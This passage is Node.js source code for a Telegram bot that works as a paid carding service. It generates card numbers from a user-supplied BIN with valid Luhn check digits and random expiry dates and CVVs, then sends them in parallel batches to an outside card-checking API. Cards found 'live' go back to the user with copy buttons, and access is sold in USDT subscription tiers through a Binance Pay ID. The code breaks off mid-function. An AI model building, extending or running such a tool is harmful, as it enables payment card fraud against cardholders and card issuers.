const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
    console.error('❌ TOKEN is required');
    process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });

// ==========================================
// قاعدة بيانات JSON
// ==========================================
const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    if (!fs.existsSync(DATA_FILE)) {
        return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null };
    }
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (e) {
        return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null };
    }
}

function saveData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

function getPlans() {
    const data = loadData();
    if (!data.plans) {
        data.plans = {
            free: { nameAr: 'مجاني', nameEn: 'Free', price: 0, cardsLimit: 15, campaignsLimit: 2, speed: 1 },
            plus: { nameAr: 'Plus', nameEn: 'Plus', price: 3, cardsLimit: 70, campaignsLimit: 3, speed: 30 },
            pro: { nameAr: 'Pro', nameEn: 'Pro', price: 5, cardsLimit: 150, campaignsLimit: 5, speed: 60 },
            vip: { nameAr: 'VIP', nameEn: 'VIP', price: 8, cardsLimit: 350, campaignsLimit: 7, speed: 100 }
        };
        saveData(data);
    }
    return data.plans;
}

function updatePlans(newPlans) {
    const data = loadData();
    data.plans = newPlans;
    saveData(data);
}

function getSubscriber(userId) {
    const data = loadData();
    if (!data.subscribers[userId]) {
        data.subscribers[userId] = {
            plan: 'free',
            startDate: new Date().toISOString(),
            endDate: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString()
        };
        saveData(data);
    }
    const sub = data.subscribers[userId];
    if (sub.plan !== 'free' && new Date(sub.endDate) < new Date()) {
        sub.plan = 'free';
        sub.startDate = new Date().toISOString();
        sub.endDate = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString();
        saveData(data);
    }
    return sub;
}

function updateSubscriber(userId, updates) {
    const data = loadData();
    data.subscribers[userId] = { ...data.subscribers[userId], ...updates };
    saveData(data);
}

function getAllSubscribers() {
    const data = loadData();
    return data.subscribers;
}

function getUserActiveCampaigns(userId) {
    const data = loadData();
    return Object.values(data.campaigns).filter(c => c.userId === userId && c.status === 'running');
}

function createCampaign(userId, bin, total) {
    const data = loadData();
    const id = Date.now() + Math.random();
    data.campaigns[id] = {
        id, userId, bin, total, current: 0, hit: 0, status: 'running', createdAt: new Date().toISOString()
    };
    saveData(data);
    return id;
}

function updateCampaign(campaignId, current, hit, status) {
    const data = loadData();
    if (data.campaigns[campaignId]) {
        if (current !== undefined) data.campaigns[campaignId].current = current;
        if (hit !== undefined) data.campaigns[campaignId].hit = hit;
        if (status !== undefined) data.campaigns[campaignId].status = status;
        saveData(data);
    }
}

function createPendingPayment(userId, plan, code) {
    const data = loadData();
    const plans = getPlans();
    const payment = {
        id: Date.now() + Math.random(),
        userId, plan, amount: plans[plan].price, code, status: 'waiting_payment', createdAt: new Date().toISOString()
    };
    data.pendingPayments.push(payment);
    saveData(data);
    return payment;
}

function getPendingPayment(userId, plan) {
    const data = loadData();
    return data.pendingPayments.find(p => p.userId === userId && p.plan === plan && p.status === 'waiting_payment');
}

function updatePendingPayment(id, status) {
    const data = loadData();
    const idx = data.pendingPayments.findIndex(p => p.id === id);
    if (idx !== -1) data.pendingPayments[idx].status = status;
    saveData(data);
}

function createPaymentProof(userId, plan, photoFileId, messageId) {
    const data = loadData();
    const proof = {
        id: Date.now() + Math.random(),
        userId, plan, photoFileId, messageId, status: 'pending', createdAt: new Date().toISOString()
    };
    data.paymentProofs.push(proof);
    saveData(data);
    return proof;
}

function getPaymentProof(id) {
    const data = loadData();
    return data.paymentProofs.find(p => p.id === id);
}

function updatePaymentProof(id, status) {
    const data = loadData();
    const idx = data.paymentProofs.findIndex(p => p.id === id);
    if (idx !== -1) data.paymentProofs[idx].status = status;
    saveData(data);
}

// ==========================================
// المتغيرات العامة
// ==========================================
const userLang = new Map();
const adminSet = new Set([643309456]);
const userStates = new Map(); // { step, bins, defaultCount, cancelFlag, activeCampaigns, progressMessages }
const BINANCE_PAY_ID = '842505320';

// ==========================================
// دوال مساعدة
// ==========================================
const countryFlags = {
    'united states': '🇺🇸', 'usa': '🇺🇸', 'us': '🇺🇸',
    'united kingdom': '🇬🇧', 'uk': '🇬🇧', 'britain': '🇬🇧',
    'saudi arabia': '🇸🇦', 'ksa': '🇸🇦', 'saudi': '🇸🇦',
    'egypt': '🇪🇬', 'uae': '🇦🇪', 'kuwait': '🇰🇼', 'qatar': '🇶🇦',
    'bahrain': '🇧🇭', 'oman': '🇴🇲', 'jordan': '🇯🇴', 'lebanon': '🇱🇧',
    'iraq': '🇮🇶', 'syria': '🇸🇾', 'palestine': '🇵🇸', 'turkey': '🇹🇷',
    'germany': '🇩🇪', 'france': '🇫🇷', 'italy': '🇮🇹', 'spain': '🇪🇸',
    'netherlands': '🇳🇱', 'belgium': '🇧🇪', 'switzerland': '🇨🇭', 'austria': '🇦🇹',
    'russia': '🇷🇺', 'china': '🇨🇳', 'japan': '🇯🇵', 'south korea': '🇰🇷',
    'india': '🇮🇳', 'brazil': '🇧🇷', 'canada': '🇨🇦', 'mexico': '🇲🇽',
    'australia': '🇦🇺', 'indonesia': '🇮🇩', 'malaysia': '🇲🇾', 'singapore': '🇸🇬',
    'thailand': '🇹🇭', 'vietnam': '🇻🇳', 'philippines': '🇵🇭', 'pakistan': '🇵🇰',
    'bangladesh': '🇧🇩', 'south africa': '🇿🇦', 'nigeria': '🇳🇬', 'morocco': '🇲🇦',
    'algeria': '🇩🇿', 'tunisia': '🇹🇳', 'libya': '🇱🇾', 'sudan': '🇸🇩', 'yemen': '🇾🇪'
};

function getFlag(countryName) {
    if (!countryName) return '🌍';
    const lower = countryName.toLowerCase();
    for (const [key, flag] of Object.entries(countryFlags)) {
        if (lower.includes(key)) return flag;
    }
    return '🌍';
}

function getCardType(cardNumber) {
    const first = cardNumber[0];
    const two = cardNumber.slice(0, 2);
    const four = cardNumber.slice(0, 4);
    if (first === '4') return 'فيزا كارد';
    if (two >= '51' && two <= '55') return 'ماستر كارد';
    if (two === '34' || two === '37') return 'امريكان اكسبريس';
    if (four === '6011' || two === '65' || (two >= '64' && two <= '65')) return 'ديسكفر';
    if (two === '35') return 'جيه سي بي';
    if (two === '30' || two === '36' || two === '38' || two === '39') return 'دينرز كلوب';
    if (two === '50') return 'ميركاتيل';
    if (two === '56' || two === '57' || two === '58') return 'مايسترو';
    return 'بطاقة ائتمانية';
}

function checkLuhn(cardNumber) {
    let sum = 0, alt = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i], 10);
        if (alt) { digit *= 2; if (digit > 9) digit -= 9; }
        sum += digit;
        alt = !alt;
    }
    return sum % 10 === 0;
}

function generateRandomMonth() { return String(Math.floor(Math.random() * 12) + 1).padStart(2, '0'); }
function generateRandomYear() { return String(new Date().getFullYear() + Math.floor(Math.random() * 5)); }
function generateRandomCVV() { return String(Math.floor(Math.random() * 900) + 100); }

function generateCardNumber(bin, length = 16) {
    let card = bin;
    while (card.length < length - 1) card += Math.floor(Math.random() * 10);
    for (let i = 0; i <= 9; i++) {
        const test = card + i;
        if (checkLuhn(test)) return test;
    }
    return card + '0';
}

function generateFullVisa(bin) {
    const num = generateCardNumber(bin);
    return `${num}|${generateRandomMonth()}|${generateRandomYear()}|${generateRandomCVV()}`;
}

function generateRandomCode() {
    return Math.random().toString(36).substring(2, 10).toUpperCase();
}

// API call with retry
async function checkSingleCard(cardString, chatId, isSilent = false, retries = 2) {
    try {
        const response = await axios.post('https://api.chkr.cc/', { data: cardString }, {
            headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json' },
            timeout: 10000
        });
        const data = response.data;
        const isLive = (data.code === 1);
        if (!isLive && !isSilent) return null;
        return {
            isLive,
            status: data.status || 'غير معروف',
            message: (data.message || '').replace(/احذفها/gi, '').trim(),
            type: (data.card && data.card.type) || getCardType(cardString.split('|')[0]),
            country: (data.card && data.card.country && data.card.country.name) || 'غير معروف'
        };
    } catch (e) {
        if (retries > 0) return checkSingleCard(cardString, chatId, isSilent, retries - 1);
        if (!isSilent) {
            const lang = userLang.get(chatId) || 'ar';
            await bot.sendMessage(chatId, translations[lang].api_error);
        }
        return null;
    }
}

function getCopyButtons(fullCard, lang) {
    const [num, month, year, cvv] = fullCard.split('|');
    const dict = translations[lang];
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: dict.btn_copy_full, callback_data: `copy_full_${fullCard}` }],
                [{ text: dict.btn_copy_num, callback_data: `copy_num_${num}` }],
                [{ text: dict.btn_copy_exp, callback_data: `copy_exp_${month}|${year}` }],
                [{ text: dict.btn_copy_cvv, callback_data: `copy_cvv_${cvv}` }]
            ]
        }
    };
}

// ==========================================
// نظام السرعة المتقدمة - تقسيم الحملة على منافذ متعددة
// ==========================================
async function runCampaignParallel(chatId, bin, totalCards, campaignId, speedPercent, state) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    
    // حساب عدد المنافذ بناءً على السرعة (1-100): 0% -> 1 منفذ، 100% -> 10 منافذ
    const numPorts = Math.max(1, Math.min(10, Math.floor(speedPercent / 10) + 1));
    const cardsPerPort = Math.floor(totalCards / numPorts);
    const remainder = totalCards % numPorts;
    
    // إنشاء رسالة التقدم الرئيسية
    let progressMsg = await bot.sendMessage(chatId, `🔄 جاري تهيئة ${numPorts} منفذ لتخمين ${totalCards} فيزا على BIN: ${bin}\n━━━━━━━━━━━━━━\n📌 BIN: ${bin}`);
    state.progressMsgId = progressMsg.message_id;
    
    // مصفوفة لتخزين نتائج كل منفذ
    let portResults = Array(numPorts).fill().map(() => ({ hit: 0, completed: 0, total: 0 }));
    let totalHits = 0;
    let completedPorts = 0;
    
    // تشغيل المنافذ بالتوازي
    const portPromises = [];
    for (let p = 0; p < numPorts; p++) {
        const startIdx = p * cardsPerPort + 1;
        const endIdx = (p === numPorts - 1) ? totalCards : (p + 1) * cardsPerPort;
        const count = endIdx - startIdx + 1;
        if (count <= 0) continue;
        portResults[p].total = count;
        
        const portPromise = (async () => {
            let portHit = 0;
            // توليد جميع الفيزات دفعة واحدة للمنفذ (يمكن تحسينها بتوليد متسلسل لكننا نريد سرعة)
            const visas = [];
            for (let i = 0; i < count; i++) {
                visas.push(generateFullVisa(bin));
            }
            // فحص جميع الفيزات بالتوازي داخل المنفذ (مع تقييد التوازي لتجنب الضغط)
            const batchSize = 5;
            for (let i = 0; i < visas.length; i += batchSize) {
                if (state.cancelFlag) break;
                const batch = visas.slice(i, i + batchSize);
                const results = await Promise.all(batch.map(v => checkSingleCard(v, chatId, true)));
                for (let j = 0; j < results.length; j++) {
                    const result = results[j];
                    if (result && result.isLive) {
                        portHit++;
                        totalHits++;
                        const fullVisa = batch[j];
                        const flag = getFlag(result.country);
                        const cardType = getCardType(fullVisa.split('|')[0]);
                        const liveText = dict.live_result
                            .replace('{card}', fullVisa)
                            .replace('{type}', cardType)
                            .replace('{country}', result.country)
                            .replace('{flag}', flag);
                        const buttons = getCopyButtons(fullVisa, lang);
                        await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons });
                    }
                }
                portResults[p].completed = Math.min(i + batchSize, visas.length);
                const percent = Math.floor((portResults.reduce((a,b) => a + b.completed, 0) / totalCards) * 100);
                try {
                    await bot.editMessageText(`🔄 جاري إنشاء الفيزا ${portResults.reduce((a,b) => a + b.completed, 0)}/${totalCards} | السرعة: ${speedPercent}% (${numPorts} منفذ) ${'▰'.repeat(Math.floor(percent/10))}${'▱'.repeat(10-Math.floor(percent/10))}\n━━━━━━━━━━━━━━\n📌 BIN: ${bin}`, {
                        chat_id: chatId, message_id: progressMsg.message_id
                    });
                } catch(e) {}
            }
            return portHit;
        })();
        portPromises.push(portPromise);
    }
    
    const hitsArray = await Promise.all(portPromises);
    const hit = hitsArray.reduce((a,b) => a + b, 0);
    
    // تحديث قاعدة البيانات
    updateCampaign(campaignId, totalCards, hit, 'completed');
    
    try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
    
    if (hit === 0) {
        const noLive = dict.no_live_found.replace('{total}', totalCards);
        const keyboard = { reply_markup: { inline_keyboard: [[{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]] } };
        await bot.sendMessage(chatId, noLive, keyboard);
    } else {
        await bot.sendMessage(chatId, dict.summary.replace('{hit}', hit).replace('{total}', totalCards));
    }
    return hit;
}

// ==========================================
// تشغيل حملات متعددة بالتوازي الكامل
// ==========================================
async function runMultipleCampaignsParallel(chatId, binsList, totalCardsPerBin) {
    const subscriber = getSubscriber(chatId);
    const planName = subscriber.plan;
    const plans = getPlans();
    const allowedCampaigns = plans[planName].campaignsLimit;
    const speedPercent = plans[planName].speed;
    const dict = translations[userLang.get(chatId) || 'ar'];
    
    if (binsList.length > allowedCampaigns) {
        await bot.sendMessage(chatId, dict.campaigns_limit_reached.replace('{limit}', allowedCampaigns));
        return;
    }
    
    const state = userStates.get(chatId);
    if (!state) return;
    
    // إنشاء الحملات في قاعدة البيانات
    const campaignIds = [];
    for (const bin of binsList) {
        const cid = createCampaign(chatId, bin, totalCardsPerBin);
        campaignIds.push(cid);
    }
    
    // تشغيل جميع الحملات بالتوازي
    const campaignPromises = binsList.map(async (bin, idx) => {
        const cid = campaignIds[idx];
        const hits = await runCampaignParallel(chatId, bin, totalCardsPerBin, cid, speedPercent, state);
        return { bin, hits };
    });
    
    const results = await Promise.all(campaignPromises);
    const totalHits = results.reduce((sum, r) => sum + r.hits, 0);
    
    if (!state.cancelFlag) {
        await bot.sendMessage(chatId, `🏁 انتهت جميع الحملات (${binsList.length} حملة بالتوازي). إجمالي البطاقات الصالحة: ${totalHits}`);
    }
    userStates.delete(chatId);
}

// ==========================================
// دوال الاشتراكات والقوائم (نفس السابق مع تعديلات طفيفة)
// ==========================================
async function handleSubscription(chatId, plan) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const subscriber = getSubscriber(chatId);
    const plans = getPlans();
    
    if (subscriber.plan === plan) {
        await bot.sendMessage(chatId, dict.already_subscribed.replace('{plan}', plans[plan][`name${lang === 'ar' ? 'Ar' : 'En'}`]));
        const upgradeButtons = [];
        if (plan === 'plus') upgradeButtons.push({ text: dict.upgrade_to_pro, callback_data: 'sub_pro' });
        if (plan === 'pro') upgradeButtons.push({ text: dict.upgrade_to_vip, callback_data: 'sub_vip' });
        if (upgradeButtons.length) {
            await bot.sendMessage(chatId, dict.upgrade_suggestion, { reply_markup: { inline_keyboard: [upgradeButtons] } });
        }
        return;
    }
    
    const code = generateRandomCode();
    createPendingPayment(chatId, plan, code);
    const text = dict.subscribe_confirm
        .replace('{plan}', plans[plan][`name${lang === 'ar' ? 'Ar' : 'En'}`])
        .replace('{amount}', plans[plan].price)
        .replace('{payId}', BINANCE_PAY_ID)
        .replace('{code}', code);
    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    
    setTimeout(async () => {
        const pending = getPendingPayment(chatId, plan);
        if (pending && pending.status === 'waiting_payment') {
            await bot.sendMessage(chatId, dict.payment_timeout);
        }
    }, 20000);
}

async function showMainMenu(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const keyboard = {
        inline_keyboard: [
            [{ text: dict.btn_guess, callback_data: 'menu_guess' }],
            [{ text: dict.btn_single, callback_data: 'menu_single' }],
            [{ text: dict.btn_subscribe, callback_data: 'menu_subscribe' }],
            [{ text: dict.btn_my_campaigns, callback_data: 'menu_my_campaigns' }]
        ]
    };
    if (adminSet.has(chatId)) {
        keyboard.inline_keyboard.push([{ text: '⚙️ إدارة البوت', callback_data: 'admin_panel' }]);
    }
    await bot.sendMessage(chatId, dict.main_menu, { reply_markup: keyboard, parse_mode: 'Markdown' });
}

async function showSubscriptionMenu(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const plans = getPlans();
    const buttons = [];
    for (const [key, plan] of Object.entries(plans)) {
        if (key !== 'free') {
            buttons.push([{ text: `${plan[`name${lang === 'ar' ? 'Ar' : 'En'}`]} - ${plan.price} USDT`, callback_data: `sub_${key}` }]);
        }
    }
    buttons.push([{ text: dict.cancel_btn, callback_data: 'cancel' }]);
    await bot.sendMessage(chatId, dict.subscription_plans, { reply_markup: { inline_keyboard: buttons } });
}

async function showMyCampaigns(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const campaigns = getUserActiveCampaigns(chatId);
    if (campaigns.length === 0) {
        await bot.sendMessage(chatId, dict.no_active_campaigns);
        return;
    }
    let text = dict.active_campaigns;
    const buttons = [];
    for (const c of campaigns) {
        text += `\n📌 BIN: ${c.bin} | Progress: ${c.current}/${c.total} | Hits: ${c.hit}`;
        buttons.push([{ text: `${dict.campaign_stopped.split(' ')[0]} ${c.id}`, callback_data: `stop_camp_${c.id}` }]);
    }
    buttons.push([{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]);
    await bot.sendMessage(chatId, text, { reply_markup: { inline_keyboard: buttons } });
}

async function showAdminPanel(chatId) {
    const keyboard = {
        inline_keyboard: [
            [{ text: '💰 تعديل الأسعار', callback_data: 'admin_edit_prices' }],
            [{ text: '⚡ تعديل السرعة', callback_data: 'admin_edit_speed' }],
            [{ text: '➕ إضافة خطة جديدة', callback_data: 'admin_add_plan' }],
            [{ text: '🎁 منح اشتراك', callback_data: 'admin_grant' }],
            [{ text: '❌ إلغاء اشتراك', callback_data: 'admin_remove' }],
            [{ text: '📋 عرض الأعضاء', callback_data: 'admin_list' }],
            [{ text: '🔙 رجوع', callback_data: 'main_menu' }]
        ]
    };
    await bot.sendMessage(chatId, '⚙️ لوحة تحكم الأدمن', { reply_markup: keyboard });
}

// ==========================================
// أوامر البوت
// ==========================================
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const keyboard = {
        inline_keyboard: [[{ text: 'العربية', callback_data: 'lang_ar' }, { text: 'English', callback_data: 'lang_en' }]]
    };
    await bot.sendMessage(chatId, 'اختر لغتك / Choose your language:', { reply_markup: keyboard });
});

bot.onText(/\/menu/, async (msg) => { await showMainMenu(msg.chat.id); });
bot.onText(/\/cancel/, async (msg) => {
    const chatId = msg.chat.id;
    const state = userStates.get(chatId);
    if (state) {
        state.cancelFlag = true;
        userStates.delete(chatId);
        const lang = userLang.get(chatId) || 'ar';
        await bot.sendMessage(chatId, translations[lang].cancel_msg);
    } else {
        await bot.sendMessage(chatId, '⚠️ لا توجد عملية نشطة.');
    }
});

bot.onText(/\/addadmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (!adminSet.has(chatId)) return;
    const id = parseInt(match[1]);
    if (!isNaN(id)) adminSet.add(id);
    await bot.sendMessage(chatId, `✅ تم إضافة أدمن ${id}`);
});
bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (!adminSet.has(chatId)) return;
    const id = parseInt(match[1]);
    if (id === 643309456) { await bot.sendMessage(chatId, '⚠️ لا يمكن إزالة الأدمن الأساسي'); return; }
    adminSet.delete(id);
    await bot.sendMessage(chatId, `✅ تم إزالة أدمن ${id}`);
});
bot.onText(/\/admins/, async (msg) => {
    const chatId = msg.chat.id;
    if (!adminSet.has(chatId)) return;
    await bot.sendMessage(chatId, `📋 الأدمن: ${Array.from(adminSet).join(', ')}`);
});

// ==========================================
// معالجة الأزرار
// ==========================================
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    await bot.answerCallbackQuery(query.id);
    
    // أزرار النسخ
    if (data.startsWith('copy_full_')) {
        await bot.sendMessage(chatId, `\`${data.replace('copy_full_', '')}\``, { parse_mode: 'Markdown' });
        return;
    }
    if (data.startsWith('copy_num_')) {
        await bot.sendMessage(chatId, `\`${data.replace('copy_num_', '')}\``, { parse_mode: 'Markdown' });
        return;
    }
    if (data.startsWith('copy_exp_')) {
        await bot.sendMessage(chatId, `\`${data.replace('copy_exp_', '')}\``, { parse_mode: 'Markdown' });
        return;
    }
    if (data.startsWith('copy_cvv_')) {
        await bot.sendMessage(chatId, `\`${data.replace('copy_cvv_', '')}\``, { parse_mode: 'Markdown' });
        return;
    }
    
    // اللغة
    if (data === 'lang_ar') {
        userLang.set(chatId, 'ar');
        await bot.sendMessage(chatId, '✅ تم تغيير اللغة إلى العربية');
        await showMainMenu(chatId);
        return;
    }
    if (data === 'lang_en') {
        userLang.set(chatId, 'en');
        await bot.sendMessage(chatId, '✅ Language changed to English');
        await showMainMenu(chatId);
        return;
    }
    
    // القائمة الرئيسية
    if (data === 'menu_guess') {
        userStates.set(chatId, { step: 'awaiting_bin', bins: [], defaultCount: null, cancelFlag: false });
        await bot.sendMessage(chatId, dict.enter_bin, { parse_mode: 'Markdown' });
        return;
    }
    if (data === 'menu_single') {
        await bot.sendMessage(chatId, dict.single_invalid, { parse_mode: 'Markdown' });
        return;
    }
    if (data === 'menu_subscribe') {
        await showSubscriptionMenu(chatId);
        return;
    }
    if (data === 'menu_my_campaigns') {
        await showMyCampaigns(chatId);
        return;
    }
    
    // زر إضافة BIN آخر
    if (data === 'add_another_bin') {
        const state = userStates.get(chatId);
        if (state && state.step === 'awaiting_decision') {
            const subscriber = getSubscriber(chatId);
            const plans = getPlans();
            const maxCampaigns = plans[subscriber.plan].campaignsLimit;
            if (state.bins.length >= maxCampaigns) {
                const upgradeBtn = { reply_markup: { inline_keyboard: [[{ text: '🚀 تطوير اشتراكك', callback_data: 'menu_subscribe' }]] } };
                await bot.sendMessage(chatId, `⚠️ لقد وصلت إلى الحد الأقصى للحملات المتزامنة (${maxCampaigns}). قم بترقية خطتك لإضافة المزيد.`, upgradeBtn);
                return;
            }
            state.step = 'awaiting_bin';
            await bot.sendMessage(chatId, '📌 أرسل الـ BIN التالي:');
        }
        return;
    }
    
    // زر تعيين العدد الافتراضي للحملات (يطلب من المستخدم إدخال الرقم)
    if (data === 'set_default_count') {
        const state = userStates.get(chatId);
        if (state && state.bins.length > 0) {
            state.step = 'awaiting_default_count';
            await bot.sendMessage(chatId, '🔢 أدخل العدد الذي تريد تخمينه لكل حملة (سيتم تطبيقه على جميع BINs الحالية والمستقبلية):');
        } else {
            await bot.sendMessage(chatId, '⚠️ يرجى إدخال BIN أولاً.');
        }
        return;
    }
    
    // بدء الحملات بالعدد الافتراضي
    if (data === 'start_with_default') {
        const state = userStates.get(chatId);
        if (!state || state.bins.length === 0) {
            await bot.sendMessage(chatId, '⚠️ لم تقم بإدخال أي BIN بعد.');
            return;
        }
        if (!state.defaultCount) {
            await bot.sendMessage(chatId, '⚠️ يرجى تعيين العدد الافتراضي أولاً باستخدام الزر المناسب.');
            return;
        }
        state.step = 'running';
        await runMultipleCampaignsParallel(chatId, state.bins, state.defaultCount);
        return;
    }
    
    // بدء الحملات مباشرة (إذا كان العدد محدداً مسبقاً من خلال سؤال كل BIN)
    if (data === 'start_campaigns') {
        const state = userStates.get(chatId);
        if (!state || state.bins.length === 0 || !state.defaultCount) {
            await bot.sendMessage(chatId, '⚠️ لم تقم بإدخال أي BIN أو تعيين العدد بعد.');
            return;
        }
        state.step = 'running';
        await runMultipleCampaignsParallel(chatId, state.bins, state.defaultCount);
        return;
    }
    
    if (data === 'cancel_guess') {
        const state = userStates.get(chatId);
        if (state) {
            state.cancelFlag = true;
            userStates.delete(chatId);
            await bot.sendMessage(chatId, dict.cancel_msg);
        }
        return;
    }
    
    if (data.startsWith('stop_camp_')) {
        const campId = parseFloat(data.split('_')[2]);
        updateCampaign(campId, null, null, 'stopped');
        await bot.sendMessage(chatId, dict.campaign_stopped.replace('{id}', campId));
        await showMyCampaigns(chatId);
        return;
    }
    
    if (data.startsWith('sub_')) {
        await handleSubscription(chatId, data.replace('sub_', ''));
        return;
    }
    
    // لوحة الأدمن
    if (data === 'admin_panel') {
        if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
        await showAdminPanel(chatId);
        return;
    }
    if (data === 'admin_edit_prices') {
        if (!adminSet.has(chatId)) return;
        userStates.set(chatId, { step: 'admin_edit_price' });
        await bot.sendMessage(chatId, 'أرسل الخطة والسعر الجديد بالصيغة: plan=price\nمثال: plus=4');
        return;
    }
    if (data === 'admin_edit_speed') {
        if (!adminSet.has(chatId)) return;
        userStates.set(chatId, { step: 'admin_edit_speed' });
        await bot.sendMessage(chatId, 'أرسل الخطة والسرعة الجديدة بالصيغة: plan=speed\nمثال: pro=80');
        return;
    }
    if (data === 'admin_add_plan') {
        if (!adminSet.has(chatId)) return;
        userStates.set(chatId, { step: 'admin_add_plan' });
        await bot.sendMessage(chatId, 'أرسل تفاصيل الخطة: name_ar|name_en|price|cardsLimit|campaignsLimit|speed\nمثال: ماكس|MAX|10|500|10|100');
        return;
    }
    if (data === 'admin_grant') {
        if (!adminSet.has(chatId)) return;
        userStates.set(chatId, { step: 'admin_grant' });
        await bot.sendMessage(chatId, 'أرسل: user_id plan\nمثال: 123456789 plus');
        return;
    }
    if (data === 'admin_remove') {
        if (!adminSet.has(chatId)) return;
        userStates.set(chatId, { step: 'admin_remove' });
        await bot.sendMessage(chatId, 'أرسل معرف المستخدم');
        return;
    }
    if (data === 'admin_list') {
        if (!adminSet.has(chatId)) return;
        const subs = getAllSubscribers();
        let msg = '📋 قائمة الأعضاء:\n';
        for (const [id, sub] of Object.entries(subs)) {
            msg += `🆔 ${id} | خطة: ${sub.plan} | ينتهي: ${sub.endDate}\n`;
        }
        await bot.sendMessage(chatId, msg);
        return;
    }
    if (data === 'main_menu') {
        await showMainMenu(chatId);
        return;
    }
    
    // قبول/رفض الدفع
    if (data.startsWith('approve_payment_') || data.startsWith('reject_payment_')) {
        if (!adminSet.has(chatId)) return;
        const parts = data.split('_');
        const action = parts[0];
        const proofId = parseFloat(parts[2]);
        const proof = getPaymentProof(proofId);
        if (proof) {
            const plans = getPlans();
            if (action === 'approve') {
                const end = new Date();
                end.setMonth(end.getMonth() + 1);
                updateSubscriber(proof.userId, {
                    plan: proof.plan,
                    startDate: new Date().toISOString(),
                    endDate: end.toISOString()
                });
                updatePaymentProof(proofId, 'approved');
                const pending = getPendingPayment(proof.userId, proof.plan);
                if (pending) updatePendingPayment(pending.id, 'approved');
                const userLangCode = userLang.get(proof.userId) || 'ar';
                await bot.sendMessage(proof.userId, translations[userLangCode].payment_approved.replace('{plan}', plans[proof.plan][`name${userLangCode === 'ar' ? 'Ar' : 'En'}`]));
                await bot.sendMessage(chatId, `✅ تم تفعيل الاشتراك للمستخدم ${proof.userId}`);
            } else {
                updatePaymentProof(proofId, 'rejected');
                const userLangCode = userLang.get(proof.userId) || 'ar';
                await bot.sendMessage(proof.userId, translations[userLangCode].payment_rejected);
                await bot.sendMessage(chatId, `❌ تم رفض الاشتراك للمستخدم ${proof.userId}`);
            }
        }
        return;
    }
});

// ==========================================
// معالجة الرسائل النصية
// ==========================================
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || text.startsWith('/')) return;
    
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const state = userStates.get(chatId);
    
    // معالجة صور الدفع
    if (msg.photo) {
        const photo = msg.photo[msg.photo.length - 1];
        const fileId = photo.file_id;
        const pendingItem = Object.values(loadData().pendingPayments).find(p => p.userId === chatId && p.status === 'waiting_payment');
        if (pendingItem) {
            const proof = createPaymentProof(chatId, pendingItem.plan, fileId, msg.message_id);
            const caption = `📸 إثبات دفع جديد\nالمستخدم: ${chatId}\nالخطة: ${pendingItem.plan}\nالمبلغ: ${pendingItem.amount} USDT\nالكود: ${pendingItem.code}`;
            const adminKeyboard = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '✅ موافقة', callback_data: `approve_payment_${proof.id}` }],
                        [{ text: '❌ رفض', callback_data: `reject_payment_${proof.id}` }]
                    ]
                }
            };
            for (const adminId of adminSet) {
                await bot.sendPhoto(adminId, fileId, { caption, ...adminKeyboard });
            }
            await bot.sendMessage(chatId, dict.payment_received);
            updatePendingPayment(pendingItem.id, 'proof_sent');
        }
        return;
    }
    
    // حالة انتظار BIN
    if (state && state.step === 'awaiting_bin') {
        if (/^\d+$/.test(text)) {
            let bin = text.slice(0, 6);
            while (bin.length < 6) bin += Math.floor(Math.random() * 10);
            state.currentBin = bin;
            // إذا كان هناك عدد افتراضي محدد مسبقًا، نضيف BIN فورًا بدون سؤال
            if (state.defaultCount) {
                state.bins.push(bin);
                await bot.sendMessage(chatId, `✅ تم إضافة BIN: ${bin} بعدد فيزات ${state.defaultCount}\nالحملات الحالية: ${state.bins.length}`);
                const plans = getPlans();
                const subscriber = getSubscriber(chatId);
                const maxCampaigns = plans[subscriber.plan].campaignsLimit;
                let buttons = [];
                if (state.bins.length >= maxCampaigns) {
                    buttons = [
                        [{ text: '🚀 تطوير اشتراكك', callback_data: 'menu_subscribe' }],
                        [{ text: '🎯 تعيين العدد الافتراضي', callback_data: 'set_default_count' }],
                        [{ text: '🚀 بدء التخمين', callback_data: 'start_with_default' }],
                        [{ text: '❌ إلغاء', callback_data: 'cancel_guess' }]
                    ];
                } else {
                    buttons = [
                        [{ text: '➕ إرسال BIN آخر', callback_data: 'add_another_bin' }],
                        [{ text: '🎯 تعيين العدد الافتراضي', callback_data: 'set_default_count' }],
                        [{ text: '🚀 بدء التخمين', callback_data: 'start_with_default' }],
                        [{ text: '❌ إلغاء', callback_data: 'cancel_guess' }]
                    ];
                }
